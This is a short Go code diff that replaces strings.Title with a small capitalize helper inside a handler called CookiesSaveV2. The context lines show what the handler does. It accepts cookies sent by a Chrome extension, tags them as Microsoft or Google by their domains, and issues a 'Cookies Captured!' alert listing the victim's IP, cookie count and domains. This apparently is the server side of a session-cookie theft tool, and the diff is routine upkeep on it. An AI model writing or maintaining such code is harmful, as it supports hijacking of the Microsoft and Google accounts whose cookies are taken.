@@ -195,7 +195,7 @@ func (c *ChromeExtension) CookiesSaveV2(g *gin.Context) {
 	}
 
 	// Build name with provider and account info
-	name := fmt.Sprintf("[%s] ", strings.Title(provider))
+	name := fmt.Sprintf("[%s] ", capitalize(provider))
 	if req.AccountName != "" {
 		name += req.AccountName
 	} else {
@@ -237,7 +237,7 @@ func (c *ChromeExtension) CookiesSaveV2(g *gin.Context) {
 		}
 		msg := fmt.Sprintf(
 			"Cookies Captured!\n\nSource: Chrome Extension\nProvider: %s\nIP: %s%s\nCookies: %d\nDomains: %s%s\nTime: %s",
-			strings.Title(provider),
+			capitalize(provider),
 			g.ClientIP(),
 			accountMsg,
 			len(req.Cookies),
@@ -264,6 +264,14 @@ func (c *ChromeExtension) CookiesSaveV2(g *gin.Context) {
 	}
 
 	g.JSON(http.StatusOK, response)
+}
+
+// capitalize returns the string with the first letter uppercased
+func capitalize(s string) string {
+	if s == "" {
+		return s
+	}
+	return strings.ToUpper(s[:1]) + s[1:]
 }
 
 // detectProvider auto-detects whether cookies are Microsoft or Google based on domains
